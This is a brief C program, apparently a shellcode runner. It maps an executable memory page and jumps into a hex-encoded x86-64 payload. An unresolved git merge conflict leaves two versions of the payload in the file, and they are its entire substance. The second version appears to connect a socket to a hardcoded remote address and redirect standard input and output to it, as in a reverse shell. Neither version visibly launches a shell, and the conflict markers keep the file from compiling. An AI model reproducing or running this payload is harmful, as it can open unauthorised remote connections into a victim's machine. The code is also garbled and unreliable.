#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
<<<<<<< HEAD
char shellcode[] = "\x31\xc0\xb0\x3f\x4c\x89\xd7\x0f\x05\x48\xc1\xee\x10\xb0\x3f\x4c\x89\xd7\x0f\x05\x48\xc1\xee\x10\xb0\x3f\x4c\x89\xd7\x0f\x05\x48\x31\xf6\x48\x29\xc0\x48\x31\xd2\xb0\x3c\x4c\x89\xd7\x0f\x05";
=======
char shellcode[] = "\x48\x31\xc0\x48\x29\xdb\x48\x31\xc9\x48\xc1\xea\x10\x48\x31\xff\x48\x31\xf6\x48\x31\xdb\x48\x31\xf6\xb0\x29\xb3\x02\x48\x89\xdf\x48\xff\xc6\x0f\x05\x48\x89\xC7\x49\x89\xFA\x04\x2A\x53\xBE\xef\x81\xEE\x70\x56\x66\x68\x23\x1d\x66\x6A\x02\x48\x89\xE6\xB2\x18\x0f\x05\x48\x29\xc0\xb0\x3f\x4c\x89\xd7\x48\xc1\xee\x10\x0f\x05\xb0\x3f\x4c\x89\xd7\x48\xff\xc6\x0f\x05\xb0\x3f\x4c\x89\xd7\x48\xff\xc6\x0f\x05\x48\x29\xc0\x48\xc1\xea\x10\xb0\x3c\x4c\x89\xd7\x0f\x05";
>>>>>>> 12a661c6c73183888ec34a7c3387bb634a7ad200
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
